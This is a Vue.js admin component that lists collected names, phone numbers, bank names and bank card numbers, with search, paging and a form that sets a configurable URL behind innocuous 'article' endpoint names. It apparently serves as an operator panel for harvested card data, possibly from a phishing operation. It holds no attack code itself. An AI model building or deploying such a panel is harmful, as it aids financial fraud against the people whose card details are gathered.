<template>
  <div>
		<el-form style="margin-top:36px" :model="form" :rules="rules" ref="ruleForm" >
				<el-form-item prop="url" label="配置url：" :label-width="formLabelWidth">
					<el-input v-model="form.url" autocomplete="off"></el-input>
				</el-form-item>
				<el-form-item :label-width="formLabelWidth">
					<el-button type="primary" @click="submitForm('ruleForm')">确 定</el-button>
				</el-form-item>
			</el-form>
			<el-form :inline="true" :model="formInline" class="demo-form-inline">
			<el-form-item label="姓名">
				<el-input v-model="formInline.username" placeholder="姓名"></el-input>
			</el-form-item>
			<el-form-item label="手机">
				<el-input v-model="formInline.phone" placeholder="手机"></el-input>
			</el-form-item>
			<el-form-item>
				<el-button type="primary" @click="onSubmit">查询</el-button>
			</el-form-item>
		</el-form>
    <el-table
      :data="docs"
      style="width: 100%">
      <el-table-column
        prop="phone"
        label="手机"
        >
      </el-table-column>
      <el-table-column
        prop="username"
        label="姓名"
        >
      </el-table-column>
      <el-table-column
        prop="rankname"
        label="银行名称">
					<template slot-scope="scope">
					<div class="align-center pb-4">
							<span  style=" line-height: 1; "><img height="30" :src="choseBank(scope.row,'img')" alt=""></span>
							<span  style=" line-height: 1; padding-left: 4px;">{{ choseBank(scope.row,'label') }}</span>
					</div>
					</template>
      </el-table-column>
			<el-table-column
        prop="rankNum"
        label="银行卡号">
      </el-table-column>
    </el-table>
		<el-pagination
		background
		layout="prev, pager, next"
		@current-change="handleCurrentChange"
		:page-size="limit"
		:total="(result.totalDocs-1)">
	</el-pagination>
	</div>
</template>

<script>
import bank from '../bank';
export default {
	name: 'collteHome',
		data() {
			return {
				bank,
				formInline: {
          phone: '',
          username: ''
        },
				
				limit:20,
				page:1,
				result: {
					docs:[],
					totalDocs:0,
				},
				form:{
					url:''
				},
				formLabelWidth: '120px',
				rules: {
					url: [
						{ required: true, message: '请输入链接', trigger: 'blur' }
					]
				},
			};
		},
	computed: {
		docs() {
			return this.result.docs.filter(v => !v.url)
		},
	}	,
  methods: {
		handleCurrentChange(p){
			this.page = p;
			let data = {
				params:{page:this.page,limit:this.limit,}
			}
			for(let key in this.formInline){
				if(this.formInline[key]){
					data.params[`${key}`]=this.formInline[`${key}`]
				}
			}
			this.loadDashBoard(data);
		},
		onSubmit() {
			this.page = 1;
			let data={
				params:{page:this.page,limit:this.limit,}
			}
			for(let key in this.formInline){
				if(this.formInline[key]){
					data.params[`${key}`]=this.formInline[`${key}`]
				}
			}
			this.loadDashBoard(data)

		},
		submitForm(formName) {
        this.$refs[formName].validate( async (valid) => {
          if (!valid) return
					let result= await this.ajaxData()
					if(result.code === 20000){
						this.$MessageBox.alert('修改成功', '提示', {
							confirmButtonText: '确定',
							callback: action => {
								console.log(action)
							}
						});
					}
        });
      },
		async	ajaxData(){
			const loading = this.$loading({
          lock: true,
          text: 'Loading',
          spinner: 'el-icon-loading',
          background: 'rgba(0, 0, 0, 0.7)'
        });
			let data=	this.$http.post(`/article/url`,this.form)
			await this.loadDashBoard()
			loading.close()
			return data
		},
		choseBank(item,key){
			console.log(item,key)
			let indx=this.bank.findIndex(v=>v.value==item.rankname)
			if(indx < 0) return ''
			console.log(key,this.bank[indx])
			return this.bank[indx][key]
		},
    async loadDashBoard(cont) {
			console.log(cont)
			if(!cont){
				cont={
					params:{
						limit:this.limit,
						page:this.page
					}
				}
			}
			console.log(cont)
			this.result= await this.$http.get(`/article/msg`,cont)
			let data= this.result.docs.filter(v => v.url)
			if(data.length>0){
				this.form.url= data[0].url
			}
		},
  },
	created() {
		this.loadDashBoard()
	}
};
</script>

<style>
</style>